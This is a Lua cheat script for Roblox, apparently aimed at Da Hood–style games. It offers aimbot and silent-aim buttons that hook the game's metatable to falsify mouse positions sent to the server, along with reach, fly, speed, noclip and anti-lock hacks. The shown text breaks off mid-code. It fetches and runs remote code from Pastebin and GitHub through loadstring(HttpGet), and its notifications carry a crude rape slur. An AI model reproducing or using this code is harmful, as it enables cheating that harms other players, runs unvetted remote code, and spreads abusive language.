-- $$\                $$\                 
-- $$ |               $$ |                
-- $$ |     $$\   $$\ $$ |  $$\  $$$$$$\  
-- $$ |     $$ |  $$ |$$ | $$  |$$  __$$\ 
-- $$ |     $$ |  $$ |$$$$$$  / $$$$$$$$ |
-- $$ |     $$ |  $$ |$$  _$$<  $$   ____|
-- $$$$$$$$\\$$$$$$  |$$ | \$$\ \$$$$$$$\ 
-- \________|\______/ \__|  \__| \_______|
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--LIBARY--
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Luke Better 🤷", "Synapse")


local AIMLOCKS = Window:NewTab("Locks🥱")
local aimlock = AIMLOCKS:NewSection("AIMLCOK HERE!")


local MOVEMENT = Window:NewTab("Movement")
local dad  = MOVEMENT:NewSection("MOVMENT/SPEED!")


local ESP = Window:NewTab("Esp")
local esp = ESP:NewSection("see through walls n shi")


local PLAYER = Window:NewTab("player")
local player = PLAYER:NewSection("PLAYER")


local FUN = Window:NewTab("Funny")
local fun = FUN:NewSection("FUN STUFF!")


local EASY = Window:NewTab("More")
local easy = EASY:NewSection("MORE SUTFF HERE")


local COOL = Window:NewTab("credits")
local cool = COOL:NewSection("All skidded anyway idc Lack#6666")





   fun:NewButton("Free Fist", "Makes the player have ainf range of fist reach", function()
-- // Variables
	local localPlayer       = game:GetService("Players").LocalPlayer
	local localCharacter    = localPlayer.Character
	local Mouse             = localPlayer:GetMouse()
	local FistControl       = false
	local LeftFist          = localCharacter.LeftHand
	local RightFist         = localCharacter.RightHand

	-- // Services
	local uis = game:GetService("UserInputService")

	-- // Coroutine Loop + Functions
	local loopFunction = function()
		LeftFist.CFrame  = CFrame.new(Mouse.Hit.p)
		RightFist.CFrame = CFrame.new(Mouse.Hit.p)
	end

	local Loop

	local Start = function()
		Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction)
	end

	local Pause = function()
		Loop:Disconnect()
	end

	-- // Hotkeys
	uis.InputBegan:connect(function(Key)
		if (Key.KeyCode == Enum.KeyCode.B) then
			if (FistControl == false) then
				FistControl = true
				Start()
				pcall(function()
					localCharacter.RightHand.RightWrist:Remove()
					localCharacter.LeftHand.LeftWrist:Remove()
				end)
			elseif (FistControl == true) then
				FistControl = false
				Pause()
				local rightwrist  = Instance.new("Motor6D")
				rightwrist.Name   = "RightWrist"
				rightwrist.Parent = localCharacter.RightHand
				rightwrist.C0     = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				rightwrist.C1     = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				rightwrist.Part0  = localCharacter.RightLowerArm
				rightwrist.Part1  = localCharacter.RightHand

				local leftwrist   = Instance.new("Motor6D")
				leftwrist.Name    = "LeftWrist"
				leftwrist.Parent  = localCharacter.LeftHand
				leftwrist.C0      = CFrame.new(0.000475466368, -0.5009287, 7.59417072e-20, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				leftwrist.C1      = CFrame.new(0.000475821638, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				leftwrist.Part0   = localCharacter.LeftLowerArm
				leftwrist.Part1   = localCharacter.LeftHand
			end
		end
	end)
end) 


aimlock:NewButton("streamble silient aim", "makes the aimbot look streamble", function()
-- // Services
local Players = game:GetService("Players")

-- // Vars
local LocalPlayer = Players.LocalPlayer
local accomidationfactor = 0.12567724521

-- // Silent Aim Module
local SilentAim = loadstring(game:HttpGet("https://pastebin.com/raw/2f0mGbMP"))()
SilentAim.TeamCheck = false
-- // Metatable vars
local mt = getrawmetatable(game)
local backupindex = mt.__index
setreadonly(mt, false)

-- // Check if player is down
SilentAim.checkSilentAim = function()
    local checkA = (SilentAim.SilentAimEnabled == true and SilentAim.Selected ~= LocalPlayer)
    local playerCharacter = SilentAim.Selected.Character
    local daHood = (playerCharacter.BodyEffects["K.O"].Value == false or playerCharacter:FindFirstChild("GRABBING_CONSTRAINT") ~= nil)

    return (checkA and daHood)
end

-- // Hook
mt.__index = newcclosure(function(t, k)
    if (t:IsA("Mouse") and (k == "Hit")) then
        print(t, k)
        local CPlayer = SilentAim.Selected
        if (SilentAim.checkSilentAim()) then
            if (CPlayer.Character:FindFirstChild("HumanoidRootPart")) then
                return {p=(CPlayer.Character.HumanoidRootPart.CFrame.p+(CPlayer.Character.HumanoidRootPart.Velocity*accomidationfactor))}
            end
        end
    end
    return backupindex(t, k)
end)

-- // Revert
setreadonly(mt, true)
getgenv().ValiantAimHacks.FOV = 50
end)




fun:NewButton("Reach", "makes your range for fist or melee ferther!", function()
  game:GetService('RunService'):BindToRenderStep("Reach", 0 , function(value)
                local success, err = pcall(function()
                    if game.Players.LocalPlayer.Character.BodyEffects.Attacking.Value == true then
                        for i,v in pairs(game:GetService('Players'):GetChildren()) do
                            if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
                                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                                    if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
                                        firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
                                    else
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
                                    end
                                end
                            end
                        end
                    end
                    end)
                end)
end)




aimlock:NewButton("AimLock", "gives you aimbot!:)", function()
local Settings = {
    rewrittenmain = {
        Enabled = true,
        Key = "q",
        DOT = true,
        AIRSHOT = true,
        NOTIF = true,
        AUTOPRED = false,
        FOV = math.huge,
        RESOVLER = false
    }
}
 
local SelectedPart = "LowerTorso"
local Prediction = true
local PredictionValue = .1209895
 
 
    local AnchorCount = 0
    local MaxAnchor = 6
 
    local CC = game:GetService"Workspace".CurrentCamera
    local Plr;
    local enabled = false
    local accomidationfactor = .1209895
    local mouse = game.Players.LocalPlayer:GetMouse()
    local placemarker = Instance.new("Part", game.Workspace)
 
    function makemarker(Parent, Adornee, Color, Size, Size2)
        local e = Instance.new("BillboardGui", Parent)
        e.Name = "PP"
        e.Adornee = Adornee
        e.Size = UDim2.new(Size, Size2, Size, Size2)
        e.AlwaysOnTop = Settings.rewrittenmain.DOT
        local a = Instance.new("Frame", e)
        if Settings.rewrittenmain.DOT == true then
        a.Size = UDim2.new(1, 0, 1, 0)
        else
        a.Size = UDim2.new(0, 0, 0, 0)
        end
        if Settings.rewrittenmain.DOT == true then
        a.Transparency = 0
        a.BackgroundTransparency = 0
        else
        a.Transparency = 1
        a.BackgroundTransparency = 1
        end
        a.BackgroundColor3 = Color
        local g = Instance.new("UICorner", a)
        if Settings.rewrittenmain.DOT == false then
        g.CornerRadius = UDim.new(0, 0)
        else
        g.CornerRadius = UDim.new(1, 1) 
        end
        return(e)
    end
 
 
    local data = game.Players:GetPlayers()
    function noob(player)
        local character
        repeat wait() until player.Character
        local handler = makemarker(guimain, player.Character:WaitForChild(SelectedPart), Color3.fromRGB(180, 125, 180), 0.3, 3)
        handler.Name = player.Name
        player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild(SelectedPart) end)
 
 
        spawn(function()
            while wait() do
                if player.Character then
                end
            end
        end)
    end
 
    for i = 1, #data do
        if data[i] ~= game.Players.LocalPlayer then
            noob(data[i])
        end
    end
 
    game.Players.PlayerAdded:connect(function(Player)
        noob(Player)
    end)
 
    spawn(function()
        placemarker.Anchored = true
        placemarker.CanCollide = false
        if Settings.rewrittenmain.DOT == true then
        placemarker.Size = Vector3.new(7, 7, 7)
        else
        placemarker.Size = Vector3.new(0, 0, 0)
        end
        placemarker.Transparency = 0.60
        if Settings.rewrittenmain.DOT then
        makemarker(placemarker, placemarker, Color3.fromRGB(180, 125, 180), 0.40, 0)
        end
    end)
 
    game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
        if k == Settings.rewrittenmain.Key and Settings.rewrittenmain.Enabled then
            if enabled == true then
                enabled = false
                if Settings.rewrittenmain.NOTIF == true then
                    Plr = getClosestPlayerToCursor()
                game.StarterGui:SetCore("SendNotification", {
                    Title = "GET RAPED";
                    Text = "UNLOCKED",
                    Duration = 3
                })
            end
            else
                Plr = getClosestPlayerToCursor()
                enabled = true
                if Settings.rewrittenmain.NOTIF == true then
 
                    game.StarterGui:SetCore("SendNotification", {
                        Title = "GET RAPED";
                        Text = "Target: "..tostring(Plr.Character.Humanoid.DisplayName),
                        Duration = 3
                    })
 
                end
            end
        end
    end)
 
 
 
    function getClosestPlayerToCursor()
        local closestPlayer
        local shortestDistance = Settings.rewrittenmain.FOV
 
        for i, v in pairs(game.Players:GetPlayers()) do
            if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
                local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
                if magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
        return closestPlayer
    end
 
    local pingvalue = nil;
    local split = nil;
    local ping = nil;
 
    game:GetService"RunService".Stepped:connect(function()
        if enabled and Plr.Character ~= nil and Plr.Character:FindFirstChild("HumanoidRootPart") then
            placemarker.CFrame = CFrame.new(Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor))
        else
            placemarker.CFrame = CFrame.new(0, 9999, 0)
        end
        if Settings.rewrittenmain.AUTOPRED == true then
             pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
             split = string.split(pingvalue,'(')
             ping = tonumber(split[1])
            if ping < 130 then
                PredictionValue = .1209895
            elseif ping < 125 then
                PredictionValue = .1209895
            elseif ping < 110 then
                PredictionValue = .1209895
            elseif ping < 105 then
                PredictionValue = .1209895
            elseif ping < 90 then
                PredictionValue = .1209895
            elseif ping < 80 then
                PredictionValue = .1209895
            elseif ping < 70 then
                PredictionValue = .1209895
            elseif ping < 60 then
                PredictionValue = .1209895
            elseif ping < 50 then
                PredictionValue = .1209895
            elseif ping < 40 then
                PredictionValue = .1209895
            end
        end
    end)
 
    local mt = getrawmetatable(game)
    local old = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(...)
        local args = {...}
        if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" and Settings.rewrittenmain.Enabled and Plr.Character ~= nil then
 
            -- args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor)
            --[[
            if Settings.rewrittenmain.AIRSHOT == true then
                if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
 
                    --// Airshot
                    args[3] = Plr.Character.LeftFoot.Position+(Plr.Character.LeftFoot.Velocity*PredictionValue)
 
                else
                    args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
 
                end
            else
                    args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
            end
            ]]
            if Prediction == true then
 
            args[3] = Plr.Character[SelectedPart].Position+(Plr.Character[SelectedPart].Velocity*PredictionValue)
 
            else
 
            args[3] = Plr.Character[SelectedPart].Position
 
            end
 
            return old(unpack(args))
        end
        return old(...)
    end)
 
    game:GetService("RunService").RenderStepped:Connect(function()
        if Settings.rewrittenmain.RESOVLER == true and Plr.Character ~= nil and enabled and Settings.rewrittenmain.Enabled then
        if Settings.rewrittenmain.AIRSHOT == true and enabled and Plr.Character ~= nil then
 
            if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
 
                --// Airshot
 
                --// Anchor Check
 
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0;
                    end
                else
                    Prediction = true
                    AnchorCount = 0;
                end
 
                SelectedPart = "LeftFoot"
 
            else
                --// Anchor Check
 
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0;
                    end
                else
                    Prediction = true
                    AnchorCount = 0;
                end
 
                SelectedPart = "HumanoidRootPart"
 
            end
            else
 
                --// Anchor Check
 
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0;
                    end
                else
                    Prediction = true
                    AnchorCount = 0;
                end
 
                SelectedPart = "HumanoidRootPart"
            end
 
        else
                SelectedPart = "HumanoidRootPart"
        end
    end)
    end)
    
    
    
    
    
    
    
    
    
    
    aimlock:NewButton("dhm aimlock OP!!", "THIS IS FOR HOOD MODDED!!!", function()
local Settings = { AimLock = { Enabled = true, Aimlockkey = "c", Prediction = 0.1318, Aimpart = 'LowerTorso', Notifications = true }, Settings = { Thickness = 8.5, Transparency = 1, Color = Color3.fromRGB(185, 0, 185), FOV = false } } local CurrentCamera = game:GetService("Workspace").CurrentCamera local Inset = game:GetService("GuiService"):GetGuiInset().Y local RunService = game:GetService("RunService") local Mouse = game.Players.LocalPlayer:GetMouse() local LocalPlayer = game.Players.LocalPlayer local Line = Drawing.new("Line") local Circle = Drawing.new("Circle") local Plr = game.Players.LocalPlayer Mouse.KeyDown:Connect(function(KeyPressed) if KeyPressed == (Settings.AimLock.Aimlockkey) then if Settings.AimLock.Enabled == true then Settings.AimLock.Enabled = false if Settings.AimLock.Notifications == true then Plr = FindClosestPlayer() game.StarterGui:SetCore("SendNotification", { Title = "GET RAPED", Text = "UNLOCKED" }) end else Plr = FindClosestPlayer() Settings.AimLock.Enabled = true if Settings.AimLock.Notifications == true then game.StarterGui:SetCore("SendNotification", { Title = "GET RAPED", Text = "Locked On : " .. tostring(Plr.Character.Humanoid.DisplayName) }) end end end end) function FindClosestPlayer() local ClosestDistance, ClosestPlayer = math.huge, nil; for _, Player in next, game:GetService("Players"):GetPlayers() do if Player ~= LocalPlayer then local Character = Player.Character if Character and Character.Humanoid.Health > 1 then local Position, IsVisibleOnViewPort = CurrentCamera:WorldToViewportPoint(Character.HumanoidRootPart .Position) if IsVisibleOnViewPort then local Distance = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(Position.X, Position.Y)).Magnitude if Distance < ClosestDistance then ClosestPlayer = Player ClosestDistance = Distance end end end end end return ClosestPlayer, ClosestDistance end RunService.Heartbeat:connect(function() if Settings.AimLock.Enabled == true then local Vector = CurrentCamera:WorldToViewportPoint(Plr.Character[Settings.AimLock.Aimpart].Position + (Plr.Character[Settings.AimLock.Aimpart].Velocity * Settings.AimLock.Prediction)) Line.Color = Settings.Settings.Color Line.Transparency = Settings.Settings .Transparency Line.Thickness = Settings.Settings .Thickness Line.From = Vector2.new(Mouse.X, Mouse.Y + Inset) Line.To = Vector2.new(Vector.X, Vector.Y) Line.Visible = true Circle.Position = Vector2.new(Mouse.X, Mouse.Y + Inset) Circle.Visible = Settings.Settings.FOV Circle.Thickness = 15.5 Circle.Thickness = 15 Circle.Radius = 450 Circle.Color = Settings.Settings.Color elseif Settings.AimLock.FOV == true then Circle.Visible = true else Circle.Visible = false Line.Visible = false end end) local mt = getrawmetatable(game) local old = mt.__namecall setreadonly(mt, false) mt.__namecall = newcclosure(function(...) local args = {...} if Settings.AimLock.Enabled and getnamecallmethod() == "FireServer" and args[2] == "MousePos" then args[3] = Plr.Character[Settings.AimLock.Aimpart].Position + (Plr.Character[Settings.AimLock.Aimpart].Velocity * Settings.AimLock.Prediction) return old(unpack(args)) end return old(...) end)end)
    
    
    
    
    
    
    
    
    
    
    
    dad:NewButton("walkspeed", "gives the player walkspeed!", function()
--Skid this shut as much as u want lmao
local Player = game:GetService'Players'.LocalPlayer;
local UIS = game:GetService'UserInputService';
UIS.InputBegan:connect(function(UserInput)
        if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.LeftShift then
            _G.Running = true
                while wait(0.005) and _G.Running == true do
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
end
        end
end)
UIS.InputEnded:connect(function(UserInput)
        if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.LeftShift then
                _G.Running = false
        end
end)
end)





dad:NewButton("fly / keybind T", "makes the player fly :)", function()
local plr = game.Players.LocalPlayer
local mouse = plr:GetMouse()
 
		localplayer = plr
 
		if workspace:FindFirstChild("Core") then
			workspace.Core:Destroy()
		end
 
		local Core = Instance.new("Part")
		Core.Name = "Core"
		Core.Size = Vector3.new(0.05, 0.05, 0.05)
 
		spawn(function()
			Core.Parent = workspace
			local Weld = Instance.new("Weld", Core)
			Weld.Part0 = Core
			Weld.Part1 = localplayer.Character.LowerTorso
			Weld.C0 = CFrame.new(0, 0, 0)
		end)
 
		workspace:WaitForChild("Core")
 
		local torso = workspace.Core
		flying = true
		local speed=10
		local keys={a=false,d=false,w=false,s=false} 
		local e1
		local e2
		local function start()
			local pos = Instance.new("BodyPosition",torso)
			local gyro = Instance.new("BodyGyro",torso)
			pos.Name="EPIXPOS"
			pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
			pos.position = torso.Position
			gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
			gyro.cframe = torso.CFrame
			repeat
				wait()
				localplayer.Character.Humanoid.PlatformStand=true
				local new=gyro.cframe - gyro.cframe.p + pos.position
				if not keys.w and not keys.s and not keys.a and not keys.d then
					speed=5
				end
				if keys.w then 
					new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
					speed=speed+0
				end
				if keys.s then 
					new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
					speed=speed+0
				end
				if keys.d then 
					new = new * CFrame.new(speed,0,0)
					speed=speed+0
				end
				if keys.a then 
					new = new * CFrame.new(-speed,0,0)
					speed=speed+0
				end
				if speed>10 then
					speed=5
				end
				pos.position=new.p
				if keys.w then
					gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*0),0,0)
				elseif keys.s then
					gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*0),0,0)
				else
					gyro.cframe = workspace.CurrentCamera.CoordinateFrame
				end
			until flying == false
			if gyro then gyro:Destroy() end
			if pos then pos:Destroy() end
			flying=false
			localplayer.Character.Humanoid.PlatformStand=false
			speed=10
		end
		e1=mouse.KeyDown:connect(function(key)
			if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
			if key=="w" then
				keys.w=true
			elseif key=="s" then
				keys.s=true
			elseif key=="a" then
				keys.a=true
			elseif key=="d" then
				keys.d=true
			elseif key=="t" then
				if flying==true then
					flying=false
				else
					flying=true
					start()
				end
			end
		end)
		e2=mouse.KeyUp:connect(function(key)
			if key=="w" then
				keys.w=false
			elseif key=="s" then
				keys.s=false
			elseif key=="a" then
				keys.a=false
			elseif key=="d" then
				keys.d=false
			end
		end)
		start()
		end)
		
		
		
		
		dad:NewButton("inf jump", "spam spacebar to jump ", function()
local Player = game:GetService'Players'.LocalPlayer;
local UIS = game:GetService'UserInputService';
 
_G.JumpHeight = 50;
 
function Action(Object, Function) if Object ~= nil then Function(Object); end end
 
UIS.InputBegan:connect(function(UserInput)
    if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space then
        Action(Player.Character.Humanoid, function(self)
            if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
                Action(self.Parent.HumanoidRootPart, function(self)
                    self.Velocity = Vector3.new(0, _G.JumpHeight, 0);
                end)
            end
        end)
    end
end)
end)




easy:NewButton("RGB", "MAKES THE GAME HAVE COLOR FOR RAGE MODE", function()
if not game:IsLoaded() then
	game.Loaded:Wait()
end
wait()

local executor = syn and "Synapse X" or KRNL_LOADED and "Krnl" or getexecutorname and getexecutorname() == "ScriptWare" or is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or secure_load and "Sentinel" or SONA_LOADED and "Sona" or "Unknown Exploit"

--// instances
local cc = Instance.new("ColorCorrectionEffect")
local lighting = game:GetService("Lighting")
local sbox = Instance.new("Sky")
--// hd killer
local ihateu = {"DepthOfFieldEffect", "SunRaysEffect", "BloomEffect", "BlurEffect", "ColorCorrectionEffect", "Atmosphere"}
for i, v in pairs(lighting:GetChildren()) do
    for index, value in ipairs(ihateu) do
    	if v:IsA(value) then
    	   v:Destroy() 
    	end
    end
end
--// setup
cc.Parent = game.Lighting
cc.Saturation = -0.1
cc.Contrast = -0.1
lighting.GlobalShadows = false

if not executor == "ScriptWare" then
	setscriptable(lighting, "Technology", true) lighting.Technology = Enum.Technology.Compatibility
end
sethiddenproperty(lighting, "Technology", Enum.Technology.Compatibility) 

settings().Rendering.QualityLevel = 4

sbox.Parent = lighting
sbox.SkyboxBk = "http://www.roblox.com/asset/?id=271042516"
sbox.SkyboxDn = "http://www.roblox.com/asset/?id=271077243"
sbox.SkyboxFt = "http://www.roblox.com/asset/?id=271042556"
sbox.SkyboxLf = "http://www.roblox.com/asset/?id=271042310"
sbox.SkyboxRt = "http://www.roblox.com/asset/?id=271042467"
sbox.SkyboxUp = "http://www.roblox.com/asset/?id=271077958"
lighting.Ambient = Color3.fromRGB(185, 0, 185)
lighting.FogColor = Color3.fromRGB(185, 0, 185)
lighting.ClockTime = 3
lighting.FogEnd = 2000
for i, v in pairs(game:GetService("Workspace"):GetChildren()) do
    if v:IsA("BasePart") and v.Material == Enum.Material.Grass then
        v.Transparency = 0.60
        v.Color = Color3.fromRGB(185, 0, 185)
    end
end
end)






easy:NewButton("anit lock - keybind{V}", "ButtonInfo", function()
local Toggled = true
local KeyCode = 'v'
local hip = 2.00
local val = -55





function AA()
    local oldVelocity = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, val, oldVelocity.Z)
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, oldVelocity.Y, oldVelocity.Z)
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, val, oldVelocity.Z)
    game.Players.LocalPlayer.Character.Humanoid.HipHeight = hip
end

game:GetService('UserInputService').InputBegan:Connect(function(Key)
    if Key.KeyCode == Enum.KeyCode[KeyCode:upper()] and not game:GetService('UserInputService'):GetFocusedTextBox() then
        if Toggled then
            Toggled = false
            game.Players.LocalPlayer.Character.Humanoid.HipHeight = hip

        elseif not Toggled then
            Toggled = true

            while Toggled do
                AA()
                task.wait()
            end
        end
    end
end)
end)









player:NewButton("headless/korblox -non FE", "makes you have headless and korblox", function()
local Main = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Korblox = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local Headless = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")

--Properties:

Main.Name = "Main"
Main.Parent = game.CoreGui
Main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MainFrame.Name = "MainFrame"
MainFrame.Parent = Main
MainFrame.BackgroundColor3 = Color3.fromRGB(164, 12, 164)
MainFrame.Position = UDim2.new(0.0751346573, 0, 0.743494451, 0)
MainFrame.Size = UDim2.new(0, 163, 0, 109)
MainFrame.Active = true
MainFrame.Draggable = true

UICorner.Parent = MainFrame

Korblox.Name = "KORBLOX!"
Korblox.Parent = MainFrame
Korblox.BackgroundColor3 = Color3.fromRGB(285, 0, 285)
Korblox.Position = UDim2.new(0.0858895704, 0, 0.0825688019, 0)
Korblox.Size = UDim2.new(0, 134, 0, 42)
Korblox.Font = Enum.Font.GothamBlack
Korblox.Text = "KORBLOX!"
Korblox.TextColor3 = Color3.fromRGB(185, 185, 185)
Korblox.TextSize = 23.000
Korblox.TextWrapped = true
Korblox.MouseButton1Click:Connect(function()
	local ply = game.Players.LocalPlayer
	local chr = ply.Character
	chr.RightLowerLeg.MeshId = "902942093"
	chr.RightLowerLeg.Transparency = "1"
	chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
	chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
	chr.RightFoot.MeshId = "902942089"
	chr.RightFoot.Transparency = "1"
end)

UICorner_2.Parent = Korblox

Headless.Name = "HEADLESS!"
Headless.Parent = MainFrame
Headless.BackgroundColor3 = Color3.fromRGB(285, 0, 285)
Headless.Position = UDim2.new(0.0858895704, 0, 0.522935808, 0)
Headless.Size = UDim2.new(0, 134, 0, 42)
Headless.Font = Enum.Font.GothamBlack
Headless.Text = "HEADLESS!"
Headless.TextColor3 = Color3.fromRGB(185, 185, 185)
Headless.TextSize = 23.000
Headless.TextWrapped = true
Headless.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character.Head.Transparency = 1
	game.Players.LocalPlayer.Character.Head.Transparency = 1
	for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
		if (v:IsA("Decal")) then
			v.Transparency = 1
		end
	end
end)

UICorner_3.Parent = Headless
end)




player:NewButton("force/reset ", "when you on the ground press it and it will make you fall throiugh the map!", function()

 
local plr = game.Players.LocalPlayer -- Player
 
local mode = "tempnoclip"
 
 
local HitPart = ""
 
 

 
 
local enabled = true
 
if (plr ~= nil) then
    
    print("Activating NoClip...")
    enabled = true
    
            
    if (mode ~= "TEMPNOCLIP" and mode ~= "tempnoclip" and mode ~= "DESTROY" and mode ~= "destroy" and mode ~= "NOCLIP" and mode ~= "noclip" and mode ~= "INVIS" and mode ~= "invis") then
        print ("Invalid mode! Setting to noclip by default!")
        mode = "noclip"
    else
        print("Succesfully Changed Mode! Mode: " ..mode)        
    end
    
    if (HitPart ~= "Head" and HitPart ~= "Torso" and HitPart ~= "HumanoidRootPart" and HitPart ~= "LeftHand" and HitPart ~= "LeftFoot" and HitPart ~= "RightFoot" and HitPart ~= "RightHand") then
        print ("Invalid Hit Object! Setting to head by default!")
        HitPart = "Head"
    else
        print ("Successfully Changed Hit Object! Object: " ..HitPart)
    end
    
    print("Noclip succesfully activated!")
    
end
 
plr.Chatted:connect(function(msg)
    
    if (msg == string.lower("noclip disable")) then
        print("Disabling noclip")
        enabled = false     
    end
    
    if (msg == string.lower("noclip enable")) then
        print("Enabling noclip")
        enabled = true
    end
end)
 
plr.Character[HitPart].Touched:connect(function(obj)
    
    if(obj:IsA("MeshPart") or obj:IsA("Part") or obj:IsA("WedgePart") or obj:IsA("UnionOperation")) then
        if(obj.CanCollide == true) then
            
            if (mode == "TEMPNOCLIP" or mode == "tempnoclip") then  
                
                if enabled == true then             
                    local ogtransp = obj.Transparency
                    
                    obj.CanCollide = false
                    obj.Transparency = 0.5
                    
                    wait(4)
                    
                    obj.CanCollide = true
                    obj.Transparency = ogtransp
                end
                
            end
            
            
            if (mode == "DESTROY" or mode == "destroy") then
                if enabled == true then
                    obj:remove()
                end
            end
            
            if (mode == "NOCLIP" or mode == "noclip") then
                if enabled == true then
                    obj.CanCollide = false
                end
            end
            
            if (mode == "INVIS" or mode == "invis") then
                if enabled == true then
                    obj.Transparency = 0.8
                    else
                end
            end
            
        end
        
    else
        print("Not Available obj")
    end
    
end)
end)





dad:NewButton("cframe-fly key{X}", "cframe fly means no clipping while flying!", function()
local Settings = {
	
	Speed = 15,
	SprintSpeed = 15,
	ToggleKey = Enum.KeyCode.X,
	SprintKey = Enum.KeyCode.LeftControl,
	
	ForwardKey = Enum.KeyCode.W,
	LeftKey = Enum.KeyCode.A,
	BackwardKey = Enum.KeyCode.S,
